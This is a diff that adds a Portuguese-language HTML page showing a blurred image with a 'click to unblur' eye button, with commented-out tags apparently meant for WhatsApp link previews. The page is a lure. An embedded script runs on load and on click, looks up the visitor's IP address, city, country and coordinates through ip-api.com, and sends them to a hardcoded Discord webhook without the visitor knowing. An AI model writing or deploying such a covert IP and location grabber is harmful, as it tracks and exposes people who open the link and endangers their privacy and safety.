@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <!-- Open Graph Meta Tags para pré-visualização no WhatsApp 
+ <meta property="og:type" content="website">
+<meta property="og:title" content="Imagem com Desfoque">
+<meta property="og:description" content="Clique para ver a imagem sem o desfoque!">
+<meta property="og:url" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQsSeAYMJfIm1-qGvHep2V2fEpzhX3_GeD-4Usl6BhlLg&s">
+-->
+
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
+  <style>
+    /* Estilo geral para a página */
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      height: 100%;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background-color: #f0f0f0;
+    }
+
+    /* Container da imagem */
+    .image-container {
+      position: relative;
+      display: inline-block;
+    }
+
+    /* Imagem com desfoque */
+    .image {
+      width: 100%;
+      max-width: 600px;
+      height: auto;
+      filter: blur(8px); /* Aplica o desfoque */
+      transition: filter 0.3s ease; /* Transição suave ao remover o desfoque */
+    }
+
+    /* Estilo do botão de olho */
+    .btn {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background: rgba(0, 0, 0, 0.5); /* Fundo semi-transparente */
+      color: white;
+      border: none;
+      border-radius: 50%;
+      font-size: 24px; /* Tamanho do ícone */
+      padding: 15px;
+      cursor: pointer;
+      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.2);
+      transition: background-color 0.3s, transform 0.3s;
+    }
+
+    /* Efeito no botão quando o mouse passa sobre ele */
+    .btn:hover {
+      background-color: rgba(0, 0, 0, 0.7);
+      transform: translate(-50%, -50%) scale(1.1);
+    }
+
+  </style>
+</head>
+<body>
+
+  <div class="image-container">
+    <!-- Imagem com desfoque -->
+    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQsSeAYMJfIm1-qGvHep2V2fEpzhX3_GeD-4Usl6BhlLg&s" alt="Imagem embaçada" class="image">
+    <!-- Botão de olho (ícone) -->
+    <button class="btn" onclick="toggleBlur();obterInformacoesIP();">
+  <i class="fas fa-eye"></i>
+</button>
+      </button>
+    </a>
+  </div>
+
+  <script>
+    // Função para alternar o desfoque da imagem
+    function toggleBlur() {
+      const image = document.querySelector('.image');
+      // Alterna o filtro de desfoque
+      if (image.style.filter === 'blur(8px)') {
+        image.style.filter = 'blur(0)';
+      } else {
+        image.style.filter = 'blur(8px)';
+      }
+    }
+  </script>
+
+<script scr="obterInformacoesIP.js">
+
+function obterInformacoesIP() {
+  fetch('http://ip-api.com/json/')
+    .then(response => response.json())
+    .then(data => {
+      // Monta a mensagem que será enviada ao Discord
+      const mensagem = {
+        content: `Aqui estão as informações do IP:\n
+                  **IP:** ${data.ip}\n
+                  **Cidade:** ${data.city}\n
+                  **País:** ${data.country}\n
+                  **Latitude:** ${data.lat}\n
+                  **Longitude:** ${data.lon}`
+      };
+
+      // URL do seu Webhook do Discord
+      const webhookUrl = 'https://discord.com/api/webhooks/1362586232504189071/Win7T8ZZKNfvhMnO44Mk533HD27XwQ270pUkLH7g0FhBt-Zcj6QN6F8LqEeTl28myVVM';
+
+      // Envia os dados via POST para o webhook
+      fetch(webhookUrl, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(mensagem)
+      })
+      .then(response => {
+        if (response.ok) {
+          console.log('Mensagem enviada para o Discord!');
+        } else {
+          console.error('Falha ao enviar mensagem para o Discord');
+        }
+      })
+      .catch(error => {
+        console.error('Erro ao enviar dados:', error);
+      });
+    })
+    .catch(error => {
+      console.error('Erro ao buscar dados do IP:', error);
+    });
+}
+
+// Chama a função para obter e enviar as informações do IP
+obterInformacoesIP();
+
+  </script>
+
+</body>
+</html>
